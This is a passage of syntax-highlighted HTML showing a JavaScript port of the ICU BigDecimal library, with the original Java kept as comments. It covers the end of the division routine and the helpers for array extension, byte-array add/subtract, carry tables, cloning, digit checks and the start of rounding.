have++;</span><br><span class="line">     <span class="keyword">if</span> (have==(reqdig+<span class="number">1</span>))</span><br><span class="line">      <span class="keyword">break</span> outer; <span class="comment">// we have all we need</span></span><br><span class="line">     <span class="keyword">if</span> (var1[<span class="number">0</span>]==<span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span> outer; <span class="comment">// residue now 0</span></span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">/* can leave now if a scaled divide and exponent is small enough */</span></span><br><span class="line">   <span class="keyword">if</span> (scale&gt;=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> ((-res.exp)&gt;scale)</span><br><span class="line">     <span class="keyword">break</span> outer;</span><br><span class="line">   <span class="comment">/* can leave now if not Divide and no integer part left  */</span></span><br><span class="line">   <span class="keyword">if</span> (code!=<span class="string">'D'</span>)</span><br><span class="line">    <span class="keyword">if</span> (res.exp&lt;=<span class="number">0</span>)</span><br><span class="line">     <span class="keyword">break</span> outer;</span><br><span class="line">   res.exp=res.exp<span class="number">-1</span>; <span class="comment">// reduce the exponent</span></span><br><span class="line">   <span class="comment">/* to get here, V1 is less than V2, so divide V2 by 10 and go for</span></span><br><span class="line"><span class="comment">      the next digit */</span></span><br><span class="line">   var2len--;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;<span class="comment">/*outer*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* here when we have finished dividing, for some reason */</span></span><br><span class="line">  <span class="comment">// have is the number of digits we collected in res.mant</span></span><br><span class="line">  <span class="keyword">if</span> (have==<span class="number">0</span>)</span><br><span class="line">   have=<span class="number">1</span>; <span class="comment">// res.mant[0] is 0; we always want a digit</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((code==<span class="string">'I'</span>)||(code==<span class="string">'R'</span>))</span><br><span class="line">   &#123;<span class="comment">/* check for integer overflow needed */</span></span><br><span class="line">    <span class="keyword">if</span> ((have+res.exp)&gt;reqdig)</span><br><span class="line">     <span class="keyword">throw</span> <span class="string">"dodivide(): Integer overflow"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code==<span class="string">'R'</span>)</span><br><span class="line">     &#123;<span class="attr">remainder</span>:<span class="keyword">do</span>&#123;</span><br><span class="line">      <span class="comment">/* We were doing Remainder -- return the residue */</span></span><br><span class="line">      <span class="keyword">if</span> (res.mant[<span class="number">0</span>]==<span class="number">0</span>)  <span class="comment">// no integer part was found</span></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">this</span>.clone(lhs).finish(set,<span class="literal">false</span>); <span class="comment">// .. so return lhs, canonical</span></span><br><span class="line">      <span class="keyword">if</span> (var1[<span class="number">0</span>]==<span class="number">0</span>)</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">this</span>.ZERO; <span class="comment">// simple 0 residue</span></span><br><span class="line">      res.ind=lhs.ind; <span class="comment">// sign is always as LHS</span></span><br><span class="line">      <span class="comment">/* Calculate the exponent by subtracting the number of padding zeros</span></span><br><span class="line"><span class="comment">         we added and adding the original exponent */</span></span><br><span class="line">      padding=((reqdig+reqdig)+<span class="number">1</span>)-lhs.mant.length;</span><br><span class="line">      res.exp=(res.exp-padding)+lhs.exp;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* strip insignificant padding zeros from residue, and create/copy</span></span><br><span class="line"><span class="comment">         the resulting mantissa if need be */</span></span><br><span class="line">      d=var1len;</span><br><span class="line">      &#123;i=d<span class="number">-1</span>;i:<span class="keyword">for</span>(;i&gt;=<span class="number">1</span>;i--)&#123;<span class="keyword">if</span>(!((res.exp&lt;lhs.exp)&amp;&amp;(res.exp&lt;rhs.exp)))<span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">if</span> (var1[i]!=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span> i;</span><br><span class="line">       d--;</span><br><span class="line">       res.exp=res.exp+<span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">      &#125;<span class="comment">/*i*/</span></span><br><span class="line">      <span class="keyword">if</span> (d&lt;var1.length)</span><br><span class="line">       &#123;<span class="comment">/* need to reduce */</span></span><br><span class="line">        newvar1=<span class="keyword">new</span> <span class="built_in">Array</span>(d);</span><br><span class="line">        <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)var1,0,(java.lang.Object)newvar1,0,d); // shorten</span></span><br><span class="line">        <span class="keyword">this</span>.arraycopy(var1,<span class="number">0</span>,newvar1,<span class="number">0</span>,d);</span><br><span class="line">        var1=newvar1;</span><br><span class="line">       &#125;</span><br><span class="line">      res.mant=var1;</span><br><span class="line">      <span class="keyword">return</span> res.finish(set,<span class="literal">false</span>);</span><br><span class="line">     &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*remainder*/</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;<span class="comment">/* 'D' -- no overflow check needed */</span></span><br><span class="line">    <span class="comment">// If there was a residue then bump the final digit (iff 0 or 5)</span></span><br><span class="line">    <span class="comment">// so that the residue is visible for ROUND_UP, ROUND_HALF_xxx and</span></span><br><span class="line">    <span class="comment">// ROUND_UNNECESSARY checks (etc.) later.</span></span><br><span class="line">    <span class="comment">// [if we finished early, the residue will be 0]</span></span><br><span class="line">    <span class="keyword">if</span> (var1[<span class="number">0</span>]!=<span class="number">0</span>)</span><br><span class="line">     &#123; <span class="comment">// residue not 0</span></span><br><span class="line">      lasthave=res.mant[have<span class="number">-1</span>];</span><br><span class="line">      <span class="keyword">if</span> (((lasthave%<span class="number">5</span>))==<span class="number">0</span>)</span><br><span class="line">       res.mant[have<span class="number">-1</span>]=(lasthave+<span class="number">1</span>);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Here for Divide or Integer Divide */</span></span><br><span class="line">  <span class="comment">// handle scaled results first ['I' always scale 0, optional for 'D']</span></span><br><span class="line">  <span class="keyword">if</span> (scale&gt;=<span class="number">0</span>)</span><br><span class="line">   &#123;<span class="attr">scaled</span>:<span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="comment">// say 'scale have res.exp len' scale have res.exp res.mant.length</span></span><br><span class="line">    <span class="keyword">if</span> (have!=res.mant.length)</span><br><span class="line">     <span class="comment">// already padded with 0's, so just adjust exponent</span></span><br><span class="line">     res.exp=res.exp-((res.mant.length-have));</span><br><span class="line">    <span class="comment">// calculate number of digits we really want [may be 0]</span></span><br><span class="line">    actdig=res.mant.length-(((-res.exp)-scale));</span><br><span class="line">    res.round(actdig,set.roundingMode); <span class="comment">// round to desired length</span></span><br><span class="line">    <span class="comment">// This could have shifted left if round (say) 0.9-&gt;1[.0]</span></span><br><span class="line">    <span class="comment">// Repair if so by adding a zero and reducing exponent</span></span><br><span class="line">    <span class="keyword">if</span> (res.exp!=(-scale))</span><br><span class="line">     &#123;</span><br><span class="line">      res.mant=<span class="keyword">this</span>.extend(res.mant,res.mant.length+<span class="number">1</span>);</span><br><span class="line">      res.exp=res.exp<span class="number">-1</span>;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">return</span> res.finish(set,<span class="literal">true</span>); <span class="comment">// [strip if not PLAIN]</span></span><br><span class="line">   &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*scaled*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// reach here only if a non-scaled</span></span><br><span class="line">  <span class="keyword">if</span> (have==res.mant.length)</span><br><span class="line">   &#123; <span class="comment">// got digits+1 digits</span></span><br><span class="line">    res.round(set);</span><br><span class="line">    have=reqdig;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;<span class="comment">/* have&lt;=reqdig */</span></span><br><span class="line">    <span class="keyword">if</span> (res.mant[<span class="number">0</span>]==<span class="number">0</span>)</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">this</span>.ZERO; <span class="comment">// fastpath</span></span><br><span class="line">    <span class="comment">// make the mantissa truly just 'have' long</span></span><br><span class="line">    <span class="comment">// [we could let finish do this, during strip, if we adjusted</span></span><br><span class="line">    <span class="comment">// the exponent; however, truncation avoids the strip loop]</span></span><br><span class="line">    newmant=<span class="keyword">new</span> <span class="built_in">Array</span>(have); <span class="comment">// shorten</span></span><br><span class="line">    <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)res.mant,0,(java.lang.Object)newmant,0,have);</span></span><br><span class="line">    <span class="keyword">this</span>.arraycopy(res.mant,<span class="number">0</span>,newmant,<span class="number">0</span>,have);</span><br><span class="line">    res.mant=newmant;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">return</span> res.finish(set,<span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Report a conversion exception. &lt;/sgml&gt; */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private void bad(char s[])&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">bad</span>(<span class="params">prefix, s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> prefix + <span class="string">"Not a number: "</span>+s;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Report a bad argument to a method. &lt;/sgml&gt;</span></span><br><span class="line"><span class="comment">    Arg1 is method name</span></span><br><span class="line"><span class="comment">    Arg2 is argument position</span></span><br><span class="line"><span class="comment">    Arg3 is what was found */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private void badarg(java.lang.String name,int pos,java.lang.String value)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">badarg</span>(<span class="params">name, pos, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="string">"Bad argument "</span>+pos+<span class="string">" to "</span>+name+<span class="string">": "</span>+value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Extend byte array to given length, padding with 0s.  If no</span></span><br><span class="line"><span class="comment">    extension is required then return the same array. &lt;/sgml&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Arg1 is the source byte array</span></span><br><span class="line"><span class="comment">    Arg2 is the new length (longer)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private static final byte[] extend(byte inarr[],int newlen)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">inarr, newlen</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--byte newarr[];</span></span><br><span class="line">  <span class="keyword">var</span> newarr;</span><br><span class="line">  <span class="keyword">if</span> (inarr.length==newlen)</span><br><span class="line">   <span class="keyword">return</span> inarr;</span><br><span class="line">  newarr=createArrayWithZeros(newlen);</span><br><span class="line">  <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)inarr,0,(java.lang.Object)newarr,0,inarr.length);</span></span><br><span class="line">  <span class="keyword">this</span>.arraycopy(inarr,<span class="number">0</span>,newarr,<span class="number">0</span>,inarr.length);</span><br><span class="line">  <span class="comment">// 0 padding is carried out by the JVM on allocation initialization</span></span><br><span class="line">  <span class="keyword">return</span> newarr;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Add or subtract two &gt;=0 integers in byte arrays</span></span><br><span class="line"><span class="comment">    &lt;p&gt;This routine performs the calculation:</span></span><br><span class="line"><span class="comment">    &lt;pre&gt;</span></span><br><span class="line"><span class="comment">    C=A+(B*M)</span></span><br><span class="line"><span class="comment">    &lt;/pre&gt;</span></span><br><span class="line"><span class="comment">    Where M is in the range -9 through +9</span></span><br><span class="line"><span class="comment">    &lt;p&gt;</span></span><br><span class="line"><span class="comment">    If M&lt;0 then A&gt;=B must be true, so the result is always</span></span><br><span class="line"><span class="comment">    non-negative.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Leading zeros are not removed after a subtraction.  The result is</span></span><br><span class="line"><span class="comment">    either the same length as the longer of A and B, or 1 longer than</span></span><br><span class="line"><span class="comment">    that (if a carry occurred).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    A is not altered unless Arg6 is 1.</span></span><br><span class="line"><span class="comment">    B is never altered.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Arg1 is A</span></span><br><span class="line"><span class="comment">    Arg2 is A length to use (if longer than A, pad with 0's)</span></span><br><span class="line"><span class="comment">    Arg3 is B</span></span><br><span class="line"><span class="comment">    Arg4 is B length to use (if longer than B, pad with 0's)</span></span><br><span class="line"><span class="comment">    Arg5 is M, the multiplier</span></span><br><span class="line"><span class="comment">    Arg6 is 1 if A can be used to build the result (if it fits)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    This routine is severely performance-critical; *any* change here</span></span><br><span class="line"><span class="comment">    must be measured (timed) to assure no performance degradation.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> <span class="comment">// 1996.02.20 -- enhanced version of DMSRCN algorithm (1981)</span></span><br><span class="line"> <span class="comment">// 1997.10.05 -- changed to byte arrays (from char arrays)</span></span><br><span class="line"> <span class="comment">// 1998.07.01 -- changed to allow destructive reuse of LHS</span></span><br><span class="line"> <span class="comment">// 1998.07.01 -- changed to allow virtual lengths for the arrays</span></span><br><span class="line"> <span class="comment">// 1998.12.29 -- use lookaside for digit/carry calculation</span></span><br><span class="line"> <span class="comment">// 1999.08.07 -- avoid multiply when mult=1, and make db an int</span></span><br><span class="line"> <span class="comment">// 1999.12.22 -- special case m=-1, also drop 0 special case</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private static final byte[] byteaddsub(byte a[],int avlen,byte b[],int bvlen,int m,boolean reuse)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">byteaddsub</span>(<span class="params">a, avlen, b, bvlen, m, reuse</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--int alength;</span></span><br><span class="line">  <span class="keyword">var</span> alength;</span><br><span class="line">  <span class="comment">//--int blength;</span></span><br><span class="line">  <span class="keyword">var</span> blength;</span><br><span class="line">  <span class="comment">//--int ap;</span></span><br><span class="line">  <span class="keyword">var</span> ap;</span><br><span class="line">  <span class="comment">//--int bp;</span></span><br><span class="line">  <span class="keyword">var</span> bp;</span><br><span class="line">  <span class="comment">//--int maxarr;</span></span><br><span class="line">  <span class="keyword">var</span> maxarr;</span><br><span class="line">  <span class="comment">//--byte reb[];</span></span><br><span class="line">  <span class="keyword">var</span> reb;</span><br><span class="line">  <span class="comment">//--boolean quickm;</span></span><br><span class="line">  <span class="keyword">var</span> quickm;</span><br><span class="line">  <span class="comment">//--int digit;</span></span><br><span class="line">  <span class="keyword">var</span> digit;</span><br><span class="line">  <span class="comment">//--int op=0;</span></span><br><span class="line">  <span class="keyword">var</span> op=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int dp90=0;</span></span><br><span class="line">  <span class="keyword">var</span> dp90=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--byte newarr[];</span></span><br><span class="line">  <span class="keyword">var</span> newarr;</span><br><span class="line">  <span class="comment">//--int i=0;</span></span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// We'll usually be right if we assume no carry</span></span><br><span class="line">  alength=a.length; <span class="comment">// physical lengths</span></span><br><span class="line">  blength=b.length; <span class="comment">// ..</span></span><br><span class="line">  ap=avlen<span class="number">-1</span>; <span class="comment">// -&gt; final (rightmost) digit</span></span><br><span class="line">  bp=bvlen<span class="number">-1</span>; <span class="comment">// ..</span></span><br><span class="line">  maxarr=bp;</span><br><span class="line">  <span class="keyword">if</span> (maxarr&lt;ap)</span><br><span class="line">   maxarr=ap;</span><br><span class="line">  reb=<span class="literal">null</span>; <span class="comment">// result byte array</span></span><br><span class="line">  <span class="keyword">if</span> (reuse)</span><br><span class="line">   <span class="keyword">if</span> ((maxarr+<span class="number">1</span>)==alength)</span><br><span class="line">    reb=a; <span class="comment">// OK to reuse A</span></span><br><span class="line">  <span class="keyword">if</span> (reb==<span class="literal">null</span>)&#123;</span><br><span class="line">   reb=<span class="keyword">this</span>.createArrayWithZeros(maxarr+<span class="number">1</span>); <span class="comment">// need new array</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  quickm=<span class="literal">false</span>; <span class="comment">// 1 if no multiply needed</span></span><br><span class="line">  <span class="keyword">if</span> (m==<span class="number">1</span>)</span><br><span class="line">   quickm=<span class="literal">true</span>; <span class="comment">// most common</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   <span class="keyword">if</span> (m==(<span class="number">-1</span>))</span><br><span class="line">    quickm=<span class="literal">true</span>; <span class="comment">// also common</span></span><br><span class="line"></span><br><span class="line">  digit=<span class="number">0</span>; <span class="comment">// digit, with carry or borrow</span></span><br><span class="line">  &#123;op=maxarr;op:<span class="keyword">for</span>(;op&gt;=<span class="number">0</span>;op--)&#123;</span><br><span class="line">   <span class="keyword">if</span> (ap&gt;=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="keyword">if</span> (ap&lt;alength)</span><br><span class="line">      digit=digit+a[ap]; <span class="comment">// within A</span></span><br><span class="line">     ap--;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">if</span> (bp&gt;=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="keyword">if</span> (bp&lt;blength)</span><br><span class="line">      &#123; <span class="comment">// within B</span></span><br><span class="line">       <span class="keyword">if</span> (quickm)</span><br><span class="line">        &#123;</span><br><span class="line">         <span class="keyword">if</span> (m&gt;<span class="number">0</span>)</span><br><span class="line">          digit=digit+b[bp]; <span class="comment">// most common</span></span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">          digit=digit-b[bp]; <span class="comment">// also common</span></span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">        digit=digit+(b[bp]*m);</span><br><span class="line">      &#125;</span><br><span class="line">     bp--;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">/* result so far (digit) could be -90 through 99 */</span></span><br><span class="line">   <span class="keyword">if</span> (digit&lt;<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> (digit&gt;=<span class="number">0</span>)</span><br><span class="line">     &#123;<span class="attr">quick</span>:<span class="keyword">do</span>&#123; <span class="comment">// 0-9</span></span><br><span class="line">      reb[op]=digit;</span><br><span class="line">      digit=<span class="number">0</span>; <span class="comment">// no carry</span></span><br><span class="line">      <span class="keyword">continue</span> op;</span><br><span class="line">     &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*quick*/</span></span><br><span class="line">   dp90=digit+<span class="number">90</span>;</span><br><span class="line">   reb[op]=<span class="keyword">this</span>.bytedig[dp90]; <span class="comment">// this digit</span></span><br><span class="line">   digit=<span class="keyword">this</span>.bytecar[dp90]; <span class="comment">// carry or borrow</span></span><br><span class="line">   &#125;</span><br><span class="line">  &#125;<span class="comment">/*op*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (digit==<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">return</span> reb; <span class="comment">// no carry</span></span><br><span class="line">  <span class="comment">// following line will become an Assert, later</span></span><br><span class="line">  <span class="comment">// if digit&lt;0 then signal ArithmeticException("internal.error ["digit"]")</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We have carry -- need to make space for the extra digit */</span></span><br><span class="line">  newarr=<span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">if</span> (reuse)</span><br><span class="line">   <span class="keyword">if</span> ((maxarr+<span class="number">2</span>)==a.length)</span><br><span class="line">    newarr=a; <span class="comment">// OK to reuse A</span></span><br><span class="line">  <span class="keyword">if</span> (newarr==<span class="literal">null</span>)</span><br><span class="line">   newarr=<span class="keyword">new</span> <span class="built_in">Array</span>(maxarr+<span class="number">2</span>);</span><br><span class="line">  newarr[<span class="number">0</span>]=digit; <span class="comment">// the carried digit ..</span></span><br><span class="line">  <span class="comment">// .. and all the rest [use local loop for short numbers]</span></span><br><span class="line">  <span class="comment">//--if (maxarr&lt;10)</span></span><br><span class="line">   &#123;<span class="keyword">var</span> $<span class="number">24</span>=maxarr+<span class="number">1</span>;i=<span class="number">0</span>;i:<span class="keyword">for</span>(;$<span class="number">24</span>&gt;<span class="number">0</span>;$<span class="number">24</span>--,i++)&#123;</span><br><span class="line">    newarr[i+<span class="number">1</span>]=reb[i];</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;<span class="comment">/*i*/</span></span><br><span class="line">  <span class="comment">//--else</span></span><br><span class="line">   <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)reb,0,(java.lang.Object)newarr,1,maxarr+1);</span></span><br><span class="line">  <span class="keyword">return</span> newarr;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Initializer for digit array properties (lookaside). &lt;/sgml&gt;</span></span><br><span class="line"><span class="comment">    Returns the digit array, and initializes the carry array. */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private static final byte[] diginit()&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">diginit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--byte work[];</span></span><br><span class="line">  <span class="keyword">var</span> work;</span><br><span class="line">  <span class="comment">//--int op=0;</span></span><br><span class="line">  <span class="keyword">var</span> op=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int digit=0;</span></span><br><span class="line">  <span class="keyword">var</span> digit=<span class="number">0</span>;</span><br><span class="line">  work=<span class="keyword">new</span> <span class="built_in">Array</span>((<span class="number">90</span>+<span class="number">99</span>)+<span class="number">1</span>);</span><br><span class="line">  &#123;op=<span class="number">0</span>;op:<span class="keyword">for</span>(;op&lt;=(<span class="number">90</span>+<span class="number">99</span>);op++)&#123;</span><br><span class="line">   digit=op<span class="number">-90</span>;</span><br><span class="line">   <span class="keyword">if</span> (digit&gt;=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">     work[op]=(digit%<span class="number">10</span>);</span><br><span class="line">     BigDecimal.prototype.bytecar[op]=(div(digit,<span class="number">10</span>)); <span class="comment">// calculate carry</span></span><br><span class="line">     <span class="keyword">continue</span> op;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">// borrowing...</span></span><br><span class="line">   digit=digit+<span class="number">100</span>; <span class="comment">// yes, this is right [consider -50]</span></span><br><span class="line">   work[op]=(digit%<span class="number">10</span>);</span><br><span class="line">   BigDecimal.prototype.bytecar[op]=((div(digit,<span class="number">10</span>))<span class="number">-10</span>); <span class="comment">// calculate borrow [NB: - after %]</span></span><br><span class="line">   &#125;</span><br><span class="line">  &#125;<span class="comment">/*op*/</span></span><br><span class="line">  <span class="keyword">return</span> work;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Create a copy of BigDecimal object for local use.</span></span><br><span class="line"><span class="comment">    &lt;p&gt;This does NOT make a copy of the mantissa array.</span></span><br><span class="line"><span class="comment">    &lt;/sgml&gt;</span></span><br><span class="line"><span class="comment">    Arg1 is the BigDecimal to clone (non-null)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private static final com.ibm.icu.math.BigDecimal clone(com.ibm.icu.math.BigDecimal dec)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">dec</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal copy;</span></span><br><span class="line">  <span class="keyword">var</span> copy;</span><br><span class="line">  copy=<span class="keyword">new</span> BigDecimal();</span><br><span class="line">  copy.ind=dec.ind;</span><br><span class="line">  copy.exp=dec.exp;</span><br><span class="line">  copy.form=dec.form;</span><br><span class="line">  copy.mant=dec.mant;</span><br><span class="line">  <span class="keyword">return</span> copy;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Check one or two numbers for lost digits. &lt;/sgml&gt;</span></span><br><span class="line"><span class="comment">    Arg1 is RHS (or null, if none)</span></span><br><span class="line"><span class="comment">    Arg2 is current DIGITS setting</span></span><br><span class="line"><span class="comment">    returns quietly or throws an exception */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private void checkdigits(com.ibm.icu.math.BigDecimal rhs,int dig)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">checkdigits</span>(<span class="params">rhs, dig</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (dig==<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">return</span>; <span class="comment">// don't check if digits=0</span></span><br><span class="line">  <span class="comment">// first check lhs...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.mant.length&gt;dig)</span><br><span class="line">   <span class="keyword">if</span> ((!(<span class="keyword">this</span>.allzero(<span class="keyword">this</span>.mant,dig))))</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"Too many digits: "</span>+<span class="keyword">this</span>.toString();</span><br><span class="line">  <span class="keyword">if</span> (rhs==<span class="literal">null</span>)</span><br><span class="line">   <span class="keyword">return</span>; <span class="comment">// monadic</span></span><br><span class="line">  <span class="keyword">if</span> (rhs.mant.length&gt;dig)</span><br><span class="line">   <span class="keyword">if</span> ((!(<span class="keyword">this</span>.allzero(rhs.mant,dig))))</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"Too many digits: "</span>+rhs.toString();</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Round to specified digits, if necessary. &lt;/sgml&gt;</span></span><br><span class="line"><span class="comment">    Arg1 is requested MathContext [with length and rounding mode]</span></span><br><span class="line"><span class="comment">    returns this, for convenience */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private com.ibm.icu.math.BigDecimal round(com.ibm.icu.math.MathContext set)&#123;</span></span><br><span class="line"> <span class="comment">//-- return round(set.digits,set.roundingMode);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Round to specified digits, if necessary.</span></span><br><span class="line"><span class="comment">    Arg1 is requested length (digits to round to)</span></span><br><span class="line"><span class="comment">            [may be &lt;=0 when called from format, dodivide, etc.]</span></span><br><span class="line"><span class="comment">    Arg2 is rounding mode</span></span><br><span class="line"><span class="comment">    returns this, for convenience</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    ind and exp are adjusted, but not cleared for a mantissa of zero</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The length of the mantissa returned will be Arg1, except when Arg1</span></span><br><span class="line"><span class="comment">    is 0, in which case the returned mantissa length will be 1.</span></span><br><span class="line"><span class="comment">    &lt;/sgml&gt;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//private com.ibm.icu.math.BigDecimal round(int len,int mode)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">round</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> len;</span><br><span class="line">  <span class="keyword">var</span> mode;</span><br><span class="line">  <span class="keyword">if</span> (round.arguments.length == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    len = round.arguments[<span class="number">0</span>];</span><br><span class="line">    mode = round.arguments[<span class="number">1</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (round.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">var</span> set = round.arguments[<span class="number">0</span>];</span><br><span class="line">    len = set.digits;</span><br><span class="line">    mode = set.roundingMode;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"round(): "</span> + round.arguments.length + <span class="string">" arguments given; expected 1 or 2"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">//int adjust;</span></span><br><span class="line">  <span class="keyword">var</span> adjust;</span><br><span class="line">  <span class="comment">//int sign;</span></span><br><span class="line">  <span class="keyword">var</span> sign;</span><br><span class="line">  <span class="comment">//byte oldmant[];</span></span><br><span class="line">  <span class="keyword">var</span> oldmant;</span><br><span class="line">  <span class="comment">//boolean reuse=false;</span></span><br><span class="line">  <span class="keyword">var</span> reuse=<span class="literal">false</span>;</span><br><span class="line">  <span class="comment">//--byte first=0;</span></span><br><span class="line">  <span class="keyword">var</span> first=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int increment;</span></span><br><span class="line">  <span class="keyword">var</span> increment;</span><br><span class="line">  <span class="comment">//--byte newmant[]=null;</span></span><br><span class="line">  <span class="keyword">var</span> newmant=<span class="literal">null</span>;</span><br><span class="line">  adjust=<span class="keyword">this</span>.mant.length-len;</span><br><span class="line">  <span class="keyword">if</span> (adjust&lt;=<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">this</span>; <span class="comment">// nowt to do</span></span><br><span class="line"></span><br><span class="line">  